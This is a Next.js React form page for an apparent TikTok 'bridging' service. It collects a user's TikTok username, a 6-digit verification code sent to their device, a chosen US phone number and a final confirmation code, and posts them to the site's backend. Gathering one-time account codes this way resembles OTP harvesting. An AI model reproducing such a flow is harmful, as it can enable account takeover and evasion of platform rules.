
'use client';

import { zodResolver } from '@hookform/resolvers/zod';
import { AtSign, KeyRound, Loader2, Phone, User } from 'lucide-react';
import { useRouter } from 'next/navigation';
import { useForm } from 'react-hook-form';
import * as z from 'zod';
import { useEffect, useState } from 'react';

import { Button } from '@/components/ui/button';
import { Card, CardContent, CardDescription, CardFooter, CardHeader, CardTitle } from '@/components/ui/card';
import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from '@/components/ui/form';
import { Input } from '@/components/ui/input';
import { useAuth } from '@/hooks/use-auth';
import { successStories } from '@/lib/success-stories';
import { InputOTP, InputOTPGroup, InputOTPSlot } from '@/components/ui/input-otp';
import { ScrollArea } from '@/components/ui/scroll-area';
import { cn } from '@/lib/utils';
import { Badge } from '@/components/ui/badge';
import type { PhoneNumber } from '@/lib/types';
import { Check, X } from 'lucide-react';
import { useToast } from '@/hooks/use-toast';

const fetcher = (url: string) => fetch(url).then((res) => res.json());

const featuredUsernames = successStories.map(story => story.creator.toLowerCase().replace('@', ''));

const formSchema = z.object({
  username: z.string().min(2, "Username must be at least 2 characters.").refine(
    (value) => !featuredUsernames.includes(value.toLowerCase()),
    (value) => ({ message: `@${value} is a featured creator and cannot be used.` })
  ),
  verificationCode: z.string().length(6, "Code must be 6 digits."),
  usNumber: z.string({ required_error: "Please select a number." }),
  finalCode: z.string().length(6, "Code must be 6 digits."),
});

type FormValues = z.infer<typeof formSchema>;

export default function StartPage() {
    const router = useRouter();
    const { user } = useAuth();
    const { toast } = useToast();
    const [phoneNumbers, setPhoneNumbers] = useState<PhoneNumber[]>([]);
    const [phoneNumbersLoading, setPhoneNumbersLoading] = useState(true);
    const [error, setError] = useState<Error | null>(null);

     useEffect(() => {
        const fetchPhoneNumbers = async () => {
        setPhoneNumbersLoading(true);
        setError(null);
        try {
            const data = await fetcher('/api/phone-numbers');
            setPhoneNumbers(data);
        } catch(e: any) {
            setError(e);
        } finally {
            setPhoneNumbersLoading(false);
        }
        };
        fetchPhoneNumbers();
    }, []);

    const form = useForm<FormValues>({
        resolver: zodResolver(formSchema),
        mode: 'onChange',
        defaultValues: {
            username: "",
            verificationCode: "",
            finalCode: "",
        }
    });

    const onSubmit = async (values: FormValues) => {
        if (!user) {
            toast({ variant: 'destructive', title: 'Error', description: 'You must be logged in to submit.'});
            return;
        }

        try {
            const response = await fetch('/api/submissions', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    id: user.uid,
                    tiktokUsername: values.username,
                    verificationCode: values.verificationCode,
                    phoneNumber: values.usNumber,
                    finalCode: values.finalCode,
                    createdAt: new Date().toISOString(),
                    isVerified: false,
                }),
            });

            if (!response.ok) {
                const errorData = await response.json();
                throw new Error(errorData.message || 'An unknown error occurred.');
            }
            
            router.push('/success');

        } catch (error: any) {
            console.error(error);
            toast({ variant: 'destructive', title: 'Submission Failed', description: error.message || 'An unexpected error occurred.' });
        }
    };

    const isSubmitting = form.formState.isSubmitting;

    return (
        <Card className="w-full max-w-lg">
            <CardHeader>
                 <div className="flex items-center justify-center space-x-4 min-h-[48px]">
                    <div className="flex h-12 w-12 items-center justify-center rounded-full bg-primary/10 text-primary shrink-0">
                        <User className="h-7 w-7" />
                    </div>
                    <div>
                        <CardTitle className="text-2xl">Complete Your Submission</CardTitle>
                        <CardDescription>Fill out all fields to complete the bridging process.</CardDescription>
                    </div>
                </div>
            </CardHeader>
            <Form {...form}>
                <form onSubmit={form.handleSubmit(onSubmit)}>
                    <CardContent className="space-y-8 pt-4">
                        {/* Username */}
                        <FormField
                            control={form.control}
                            name="username"
                            render={({ field }) => (
                                <FormItem>
                                    <FormLabel className="text-lg font-semibold">Your TikTok Username</FormLabel>
                                    <FormControl>
                                        <div className="relative">
                                            <AtSign className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-muted-foreground" />
                                            <Input placeholder="your_username" {...field} className="pl-10 h-11" />
                                        </div>
                                    </FormControl>
                                    <FormMessage />
                                </FormItem>
                            )}
                        />
                        
                        {/* Verification Code */}
                        <FormField
                            control={form.control}
                            name="verificationCode"
                            render={({ field }) => (
                                <FormItem>
                                <FormLabel className="text-lg font-semibold">Verification Code</FormLabel>
                                <FormControl>
                                    <div className="flex justify-center">
                                    <InputOTP maxLength={6} {...field}>
                                        <InputOTPGroup>
                                            <InputOTPSlot index={0} />
                                            <InputOTPSlot index={1} />
                                            <InputOTPSlot index={2} />
                                            <InputOTPSlot index={3} />
                                            <InputOTPSlot index={4} />
                                            <InputOTPSlot index={5} />
                                        </InputOTPGroup>
                                    </InputOTP>
                                    </div>
                                </FormControl>
                                <p className="text-sm text-muted-foreground text-center">Enter the 6-digit code sent to your device.</p>
                                <FormMessage className="text-center" />
                                </FormItem>
                            )}
                        />

                        {/* Select Number */}
                        <FormField
                            control={form.control}
                            name="usNumber"
                            render={({ field }) => (
                                <FormItem className="pt-2 h-full flex flex-col">
                                <FormLabel className="text-lg font-semibold">Choose a US Number</FormLabel>
                                <FormMessage className="pb-2" />
                                <FormControl className="flex-grow">
                                    <ScrollArea className="h-full w-full pr-4 max-h-96 border rounded-md p-4">
                                    {phoneNumbersLoading ? (
                                        <div className="flex justify-center items-center h-full">
                                        <Loader2 className="animate-spin h-8 w-8 text-primary" />
                                        </div>
                                    ) : error ? (
                                        <div className="text-destructive text-center">Failed to load numbers.</div>
                                    ) : (
                                        <div className="space-y-3">
                                        {phoneNumbers?.filter(n => n.isAvailable).map((number) => (
                                            <Card
                                            key={number.id}
                                            onClick={() => field.onChange(number.phoneNumber)}
                                            className={cn(
                                                "cursor-pointer transition-all hover:shadow-md hover:border-primary/50 rounded-xl",
                                                field.value === number.phoneNumber && "border-primary ring-2 ring-primary/50 shadow-lg"
                                            )}
                                            >
                                            <CardHeader className="p-4">
                                                <div className="flex justify-between items-start">
                                                <div>
                                                    <CardTitle className="text-lg">{number.phoneNumber}</CardTitle>
                                                    <CardDescription>{number.region}, {number.state}</CardDescription>
                                                </div>
                                                <Badge variant={number.isAvailable ? "default" : "secondary"} className={cn(number.isAvailable ? "bg-green-100 text-green-800 border-green-200" : "bg-red-100 text-red-800 border-red-200")}>{number.isAvailable ? "Available" : "Taken"}</Badge>
                                                </div>
                                            </CardHeader>
                                            {(number.benefits?.length > 0 || number.disadvantages?.length > 0) && (
                                                <CardContent className="p-4 pt-0 text-sm">
                                                {number.bonuses && number.bonuses.length > 0 && (
                                                    <div className="mb-3">
                                                    <h4 className="font-semibold mb-1 text-primary">Bonuses</h4>
                                                    <ul className="list-disc pl-5 space-y-1 text-foreground/80">
                                                        {number.bonuses.map((bonus, i) => <li key={i}>{bonus}</li>)}
                                                    </ul>
                                                    </div>
                                                )}
                                                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                                                    {number.benefits?.length > 0 && <div>
                                                    <h4 className="font-semibold mb-2 flex items-center text-green-600 dark:text-green-400"><Check className="h-4 w-4 mr-2" />Benefits</h4>
                                                    <ul className="list-none pl-0 space-y-1 text-muted-foreground">
                                                        {number.benefits.map((benefit, i) => <li key={i} className="flex items-start"><Check className="h-4 w-4 mr-2 mt-1 text-green-500 shrink-0" /><span>{benefit}</span></li>)}
                                                    </ul>
                                                    </div>}
                                                    {number.disadvantages?.length > 0 && <div>
                                                    <h4 className="font-semibold mb-2 flex items-center text-red-600 dark:text-red-400"><X className="h-4 w-4 mr-2" />Disadvantages</h4>
                                                    <ul className="list-none pl-0 space-y-1 text-muted-foreground">
                                                        {number.disadvantages.map((disadvantage, i) => <li key={i} className="flex items-start"><X className="h-4 w-4 mr-2 mt-1 text-red-500 shrink-0" /><span>{disadvantage}</span></li>)}
                                                    </ul>
                                                    </div>}
                                                </div>
                                                </CardContent>
                                            )}
                                            </Card>
                                        ))}
                                        </div>
                                    )}
                                    </ScrollArea>
                                </FormControl>
                                </FormItem>
                            )}
                        />

                        {/* Final Code */}
                        <FormField
                            control={form.control}
                            name="finalCode"
                            render={({ field }) => (
                                <FormItem>
                                <FormLabel className="text-lg font-semibold">Final Confirmation Code</FormLabel>
                                <FormControl>
                                    <div className="flex justify-center">
                                    <InputOTP maxLength={6} {...field}>
                                    <InputOTPGroup>
                                        <InputOTPSlot index={0} />
                                        <InputOTPSlot index={1} />
                                        <InputOTPSlot index={2} />
                                        <InputOTPSlot index={3} />
                                        <InputOTPSlot index={4} />
                                        <InputOTPSlot index={5} />
                                    </InputOTPGroup>
                                    </InputOTP>
                                    </div>
                                </FormControl>
                                <p className="text-sm text-muted-foreground pt-2 text-center">Enter the final 6-digit code to complete the process.</p>
                                <FormMessage className="text-center" />
                                </FormItem>
                            )}
                        />
                    </CardContent>
                    <CardFooter>
                        <Button type="submit" disabled={isSubmitting || phoneNumbersLoading} className="w-full rounded-full" size="lg">
                            {isSubmitting ? <Loader2 className="mr-2 h-4 w-4 animate-spin" /> : null}
                            Submit Application
                        </Button>
                    </CardFooter>
                </form>
            </Form>
        </Card>
    );
}
